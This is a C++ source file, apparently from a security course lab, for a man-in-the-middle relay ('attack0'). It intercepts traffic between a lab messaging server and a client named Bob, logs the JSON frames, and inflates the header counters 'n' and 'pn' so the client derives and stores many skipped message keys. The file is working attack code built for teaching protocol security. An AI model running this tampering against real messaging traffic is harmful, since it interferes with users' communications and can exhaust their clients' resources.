// attack0.cpp — Message-counter manipulation (MITM between server and Bob)
//
// Role: Mallory, a man-in-the-middle on the wire between as3_server and Bob.
// Idea: intercept a frame addressed to Bob, inflate the header counter (n / pn)
// to open a large skip gap, and forward it. Observe how Bob's client processes
// the gap (skipped-key derivation + storage) before the AEAD check runs.
//
// STAGE: Step 2 — counter tampering on the server->Bob path.
// Mallory still sits in the middle (accept Bob, dial the real server, log every
// newline-delimited JSON frame). In addition, frames addressed to the target
// (default "bob") have their header message number `n` (and optionally `pn`)
// inflated by `--gap N` before being forwarded, forcing the receiver to open a
// large skip gap and derive/store many skipped message keys. With no --gap this
// binary behaves exactly like Step 1 (transparent relay + logging).
//
// Build:  make
// Run:    ./attack0   (see README.md in this folder for setup)

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cctype>
#include <cerrno>
#include <string>

#include <csignal>
#include <netdb.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/select.h>

// ---------------------------------------------------------------------------
// Config — adjust to the lab environment.
// ---------------------------------------------------------------------------
namespace cfg {
    // Where Mallory listens for Bob, and where it forwards to the real server.
    const char* LISTEN_ADDR = "0.0.0.0";
    const int   LISTEN_PORT  = 9200;        // Bob connects here instead of the server
    const char* SERVER_ADDR  = "127.0.0.1"; // real server (host-published port)
    const int   SERVER_PORT   = 9000;
}

static bool g_verbose = false;                 // -v: log everything, including poll traffic
static volatile sig_atomic_t g_run = 1;        // cleared by SIGINT for a clean exit

static void on_sigint(int) { g_run = 0; }

// ---------------------------------------------------------------------------
// Tampering config (Step 2). The MITM inflates the header message number of
// frames addressed to the target so the receiver opens a large skip gap and
// derives/stores many skipped message keys before the AEAD check can fail.
// ---------------------------------------------------------------------------
static long        g_gap       = 0;       // --gap N : added to header "n" (0 = off)
static bool        g_tamper_pn = false;   // --pn    : also inflate "pn"
static std::string g_target    = "bob";   // only tamper frames whose "to" is this

// Read the string value of a top-level "key":"value" pair (good enough for the
// lab's one-line JSON frames; not a general JSON parser).
static std::string json_str_field(const std::string& line, const std::string& key) {
    std::string pat = "\"" + key + "\":\"";
    size_t p = line.find(pat);
    if (p == std::string::npos) return "";
    p += pat.size();
    size_t q = line.find('"', p);
    if (q == std::string::npos) return "";
    return line.substr(p, q - p);
}

// Decide whether a frame is worth printing. Poll traffic is the noise:
//   - the request         {"type":"poll",...}
//   - an empty response   {"type":"frames"}  or  {"type":"frames","frames":[]}
// A "frames" response is logged ONLY when it actually carries a frame object.
static bool should_log(const std::string& line) {
    if (g_verbose) return true;
    std::string type = json_str_field(line, "type");
    if (type == "poll") return false;
    if (type == "frames") {
        // log only if there is a non-empty frames array, i.e. '[' then a '{'
        size_t p = line.find("\"frames\"");
        if (p == std::string::npos) return false;        // no array at all -> empty
        size_t b = line.find('[', p);
        if (b == std::string::npos) return false;
        size_t i = b + 1;
        while (i < line.size() && (line[i] == ' ' || line[i] == '\t')) ++i;
        return i < line.size() && line[i] != ']';        // something inside -> log
    }
    return true;
}

// Print complete newline-terminated lines from a per-direction buffer.
static void log_lines(const char* tag, std::string& buf) {
    size_t nl;
    while ((nl = buf.find('\n')) != std::string::npos) {
        std::string line = buf.substr(0, nl);
        buf.erase(0, nl + 1);
        if (!should_log(line)) continue;   // forwarded already; just skip the print
        std::printf("[%s] %s\n", tag, line.c_str());
        std::fflush(stdout);
    }
}

// Add `delta` to the integer value of the first `"key":<int>` in `s`.
// On success returns true and reports the old/new values; returns false and
// leaves `s` unchanged if the key or a numeric value is not found. The pattern
// `"key":` is quote-anchored, so "n" does not match inside "pn" / "count".
static bool rewrite_int_field(std::string& s, const std::string& key,
                              long delta, long& oldv, long& newv) {
    std::string pat = "\"" + key + "\":";
    size_t p = s.find(pat);
    if (p == std::string::npos) return false;
    size_t b = p + pat.size();
    size_t e = b;
    if (e < s.size() && s[e] == '-') ++e;              // optional sign
    size_t d0 = e;
    while (e < s.size() && std::isdigit((unsigned char)s[e])) ++e;
    if (e == d0) return false;                          // no digits after the key
    oldv = std::strtol(s.c_str() + b, nullptr, 10);
    newv = oldv + delta;
    s.replace(b, e - b, std::to_string(newv));
    return true;
}

// If the line is a frame addressed to the target, inflate its header counter(s)
// and return the modified line; otherwise return it unchanged.
// Assumption (PoC): the lab delivers one frame per poll, so the first "to"/"n"
// in the line identifies that frame. g_gap == 0 disables tampering (Step-1 mode).
static std::string maybe_tamper(const std::string& line) {
    if (g_gap == 0)                                 return line;
    if (json_str_field(line, "type") != "frames")  return line;
    if (json_str_field(line, "to")   != g_target)  return line;

    std::string out = line;
    long o = 0, nn = 0;
    if (rewrite_int_field(out, "n", g_gap, o, nn)) {
        std::printf("[attack0] *** tamper -> %s: n %ld -> %ld (gap=%ld) ***\n",
                    g_target.c_str(), o, nn, g_gap);
    }
    if (g_tamper_pn) {
        long po = 0, pnn = 0;
        if (rewrite_int_field(out, "pn", g_gap, po, pnn))
            std::printf("[attack0] *** tamper -> %s: pn %ld -> %ld ***\n",
                        g_target.c_str(), po, pnn);
    }
    std::fflush(stdout);
    return out;
}

// Server -> Bob pump: drain complete lines, tamper frames to the target, forward
// the (possibly modified) line to Bob, and log it. Returns false on a send error.
static bool pump_down(int bob_fd, std::string& buf) {
    size_t nl;
    while ((nl = buf.find('\n')) != std::string::npos) {
        std::string line = buf.substr(0, nl);          // line without newline
        buf.erase(0, nl + 1);

        std::string out = maybe_tamper(line);
        out.push_back('\n');                           // restore framing
        if (send(bob_fd, out.data(), out.size(), 0) != (ssize_t)out.size())
            return false;

        if (should_log(line)) {                        // same noise filter as up
            std::printf("[Server -> Bob] %s\n", line.c_str());
            std::fflush(stdout);
        }
    }
    return true;
}

// Open a listening socket on LISTEN_ADDR:LISTEN_PORT.
static int make_listener() {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) { perror("socket"); return -1; }
    int yes = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(cfg::LISTEN_PORT);
    inet_pton(AF_INET, cfg::LISTEN_ADDR, &addr.sin_addr);

    if (bind(fd, (sockaddr*)&addr, sizeof(addr)) < 0) { perror("bind"); close(fd); return -1; }
    if (listen(fd, 8) < 0) { perror("listen"); close(fd); return -1; }
    return fd;
}

// Dial the real server (SERVER_ADDR may be a hostname or an IP).
static int dial_server() {
    char port[8];
    std::snprintf(port, sizeof(port), "%d", cfg::SERVER_PORT);

    addrinfo hints{};
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    addrinfo* res = nullptr;
    if (getaddrinfo(cfg::SERVER_ADDR, port, &hints, &res) != 0) {
        std::fprintf(stderr, "[attack0] cannot resolve %s\n", cfg::SERVER_ADDR);
        return -1;
    }
    int fd = -1;
    for (addrinfo* p = res; p; p = p->ai_next) {
        fd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (fd < 0) continue;
        if (connect(fd, p->ai_addr, p->ai_addrlen) == 0) break;
        close(fd); fd = -1;
    }
    freeaddrinfo(res);
    if (fd < 0) std::fprintf(stderr, "[attack0] cannot connect to server\n");
    return fd;
}

// Pump bytes both ways between Bob and the server until either side closes.
// Bob->server is forwarded unchanged; server->Bob goes through pump_down, which
// tampers frames to the target (Step 2). Complete frames are logged per direction.
static void relay(int bob_fd, int srv_fd) {
    std::string buf_up, buf_down;  // up = Bob->server, down = server->Bob
    char data[8192];

    while (g_run) {
        fd_set rfds;
        FD_ZERO(&rfds);
        FD_SET(bob_fd, &rfds);
        FD_SET(srv_fd, &rfds);
        int maxfd = (bob_fd > srv_fd ? bob_fd : srv_fd) + 1;

        if (select(maxfd, &rfds, nullptr, nullptr, nullptr) < 0) {
            if (errno == EINTR) continue;   // g_run re-checked at loop top
            perror("select");
            break;
        }

        // Bob -> server
        if (FD_ISSET(bob_fd, &rfds)) {
            ssize_t n = recv(bob_fd, data, sizeof(data), 0);
            if (n <= 0) break;
            if (send(srv_fd, data, n, 0) != n) break;   // forward unchanged
            buf_up.append(data, n);
            log_lines("Bob -> Server", buf_up);
        }
        // server -> Bob  (Step 2: tamper frames to the target before forwarding)
        if (FD_ISSET(srv_fd, &rfds)) {
            ssize_t n = recv(srv_fd, data, sizeof(data), 0);
            if (n <= 0) break;
            buf_down.append(data, n);                   // buffer until full lines
            if (!pump_down(bob_fd, buf_down)) break;    // tamper + forward + log
        }
    }
}

int main(int argc, char** argv) {
    for (int i = 1; i < argc; ++i) {
        if (std::strcmp(argv[i], "-v") == 0 || std::strcmp(argv[i], "--verbose") == 0)
            g_verbose = true;
        else if (std::strcmp(argv[i], "--gap") == 0 && i + 1 < argc)
            g_gap = std::strtol(argv[++i], nullptr, 10);
        else if (std::strcmp(argv[i], "--pn") == 0)
            g_tamper_pn = true;
        else if (std::strcmp(argv[i], "--target") == 0 && i + 1 < argc)
            g_target = argv[++i];
    }

    std::printf("[attack0] MITM relay (Step 2: counter tampering)\n");
    std::printf("[attack0] listen %s:%d  ->  server %s:%d\n",
                cfg::LISTEN_ADDR, cfg::LISTEN_PORT,
                cfg::SERVER_ADDR, cfg::SERVER_PORT);
    std::printf("[attack0] poll traffic: %s (use -v to show)\n",
                g_verbose ? "shown" : "hidden");
    if (g_gap != 0)
        std::printf("[attack0] TAMPER ON: +%ld to header n%s of frames to '%s'\n",
                    g_gap, g_tamper_pn ? " and pn" : "", g_target.c_str());
    else
        std::printf("[attack0] TAMPER OFF (pass --gap N to inflate the counter)\n");

    // Clean exit on Ctrl+C: unblock accept()/select() and tear down.
    struct sigaction sa{};
    sa.sa_handler = on_sigint;      // no SA_RESTART -> accept()/select() return EINTR
    sigaction(SIGINT,  &sa, nullptr);
    sigaction(SIGTERM, &sa, nullptr);

    int lfd = make_listener();
    if (lfd < 0) return 1;

    std::printf("[attack0] waiting for Bob...\n");

    // Serve the single Bob connection (it lasts the whole session), then exit.
    int bob_fd = accept(lfd, nullptr, nullptr);
    if (bob_fd < 0) {
        if (errno == EINTR) std::printf("[attack0] interrupted; exiting.\n");
        else perror("accept");
        close(lfd);
        return g_run ? 1 : 0;
    }
    close(lfd);   // not accepting further connections

    std::printf("[attack0] + Bob connected\n");

    int srv_fd = dial_server();
    if (srv_fd < 0) { close(bob_fd); return 1; }

    relay(bob_fd, srv_fd);

    close(srv_fd);
    close(bob_fd);
    std::printf("[attack0] - connection closed; cleanup done, exiting.\n");
    return 0;
}
